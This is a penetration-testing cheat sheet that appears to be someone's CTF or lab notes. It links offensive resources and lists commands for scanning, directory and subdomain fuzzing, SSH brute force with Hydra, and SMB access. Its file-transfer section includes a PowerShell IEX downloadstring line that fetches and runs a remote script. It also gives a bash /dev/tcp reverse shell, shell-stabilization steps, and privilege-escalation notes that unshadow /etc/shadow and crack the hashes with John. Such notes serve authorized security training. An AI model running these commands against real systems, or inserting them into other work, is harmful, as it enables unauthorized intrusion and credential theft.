# Links
## General & Information
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
[HackTricks](https://book.hacktricks.xyz/)
[GTFOBins](https://gtfobins.github.io/)
## Tools
[CyberChef](https://gchq.github.io/CyberChef/)
[CrackStation](https://crackstation.net/)
https://www.revshells.com/
## Downloads
[LinPEAS](https://github.com/peass-ng/PEASS-ng/releases)
[WinPEAS](https://github.com/peass-ng/PEASS-ng/releases)
[PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
# Enumeration
## Nmap
```
nmap -T4 -p- <ip>
```
```
nmap -T4 -A -p <port1>,<port2> <ip>
```
`-sS`: TCP SYN
`-sU`: UDP Scan
## Directories
### Gobuster
```
gobuster dir -u http://<ip>:<port> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
### DirBuster
```
dirbuster&
```
## Subdomains
### Fuff
```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://<ip> -H "HOST: FUZZ.<domain>.com" [-fc <code>] [-fs <size>]
```
### AMASS
```
amass enum -d <domain>.com [-v] [-o <filename>]
```
# Ports & Services
## SSH
### Bruteforcing with Hydra
```
hydra -l <username> -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://<ip>:22 [-t 4] [-V]
```
## Smbclient
List file shares:
```
smbclient -L \\\\<ip>\\
```
Connect to a specific share:
```
smbclient \\\\<ip>\\<share>
```
# File Transfer
## Python Server
Start python server in current directory:
```
python3 -m http.server 8000
```
Linux:
```
wget http://<ip>:8000/linpeas.sh
```
Windows:
```
certutil -urlcache -f http://<ip>:8000/filename.sh
```
```
IEX(New-Object Net.WebClient).downloadstring("http://<ip>/powerup.ps1")
```
## Secure Copy Protocol
Local -> Remote:
```
scp /<local-origin-path> <username>@<remote-host>:/<remote-destination-path>
```
Remote -> Local:
```
scp <username>@<origin-host>:/<remote-origin-path> /<local-destination-path>
```
# Reverse Shells
## Bash
```
bash -i >& /dev/tcp/<ip>/<port> 0>&1
```
# Netcat Shell Stabilization
Use `python`, `python2` or `python3` depending on the system:
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

```
export TERM=xterm
```

Press `Ctrl + Z` to background the netcat shell

```
stty raw -echo; fg
```
# Privilege Escalation
```
LinEnum
sudo -l -> GTFOBins (linux)
Metasploit: local_exploit_suggester (once you have a session)

Windows:
https://www.fuzzysecurity.com/tutorials/16.html
Sherlock Rastamouse
windows-exploit-suggester (python script)
Windows example of Sherlock running:
C:\Users\kostas\Desktop>powershell.exe -exec bypass -Command “& {Import-Module .\sherlock.ps1; Find-AllVulns}”


/etc/shadow & /etc/passwd
unshadow passwd.txt shadow.txt > passwords.txt
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```
# Hash Cracking
## John the Ripper
## Hydra
